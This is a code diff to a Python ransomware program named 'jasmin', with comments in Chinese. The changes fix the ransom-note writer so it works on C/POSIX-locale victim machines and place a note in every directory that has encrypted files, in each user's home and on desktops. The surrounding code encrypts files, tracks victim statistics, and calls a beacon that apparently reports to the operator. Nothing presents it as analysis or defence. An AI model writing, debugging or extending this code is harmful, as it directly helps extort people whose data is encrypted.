@@ -138,15 +138,23 @@ def get_sid():
 
 def drop_notes(dirs,sid):
     txt=RANSOM_TXT.replace('{sid}',sid)
+    # 必须显式 utf-8：受害者机器 locale 可能是 C/POSIX，
+    # 默认编码写中文会抛 UnicodeEncodeError 并被 except 静默吞掉 -> 勒索信不生成
+    written=0
     for d in dirs:
         if not os.path.isdir(d):continue
-        try:open(os.path.join(d,NOTE_NAME),'w').write(txt)
-        except:pass
+        try:
+            with open(os.path.join(d,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
+            written+=1
+        except Exception:pass
         for desk in ['Desktop','桌面']:
             dp=os.path.join(d,desk)
             if os.path.isdir(dp):
-                try:open(os.path.join(dp,NOTE_NAME),'w').write(txt)
-                except:pass
+                try:
+                    with open(os.path.join(dp,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
+                    written+=1
+                except Exception:pass
+    sys.stderr.write('[jasmin] 勒索信已投放 %d 处\n'%written)
 
 # ────────────────────────────────────────
 # 进度条
@@ -260,6 +268,7 @@ def main():
     sys.stderr.write('[jasmin] 发现 %d 个目标文件，合计 %s\n'%(n_total,_fmt_b(b_total)))
 
     stats={'count':0,'size':0,'types':set(),'detail':{},'total_count':n_total,'total_size':b_total}
+    hit_dirs=set()   # 记录含有被加密文件的目录 —— 勒索信必须投放到每一个
 
     if n_total>0:
         # ── 阶段2: 加密（带实时进度条） ──
@@ -276,6 +285,7 @@ def main():
                     tick(fp,sz,ok)
                     if ok:
                         stats['count']+=1;stats['size']+=sz
+                        hit_dirs.add(dp)
                         _,e=os.path.splitext(f)
                         if e:
                             e=e.lower();stats['types'].add(e)
@@ -284,13 +294,14 @@ def main():
         finish()
         sys.stderr.write('[jasmin] 加密完成: %d/%d 个文件, %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
 
-    note_dirs=roots+[os.path.expanduser('~')]
+    note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
     try:
         for u in os.listdir('/home'):
             p='/home/'+u
-            if os.path.isdir(p):note_dirs.append(p)
+            if os.path.isdir(p):note_dirs.add(p)
     except:pass
-    drop_notes(note_dirs,sid)
+    note_dirs|=hit_dirs      # 关键：被加密文件所在的每个目录都要有勒索信
+    drop_notes(sorted(note_dirs),sid)
     beacon(sid,stats)
 
 if __name__=='__main__':main()
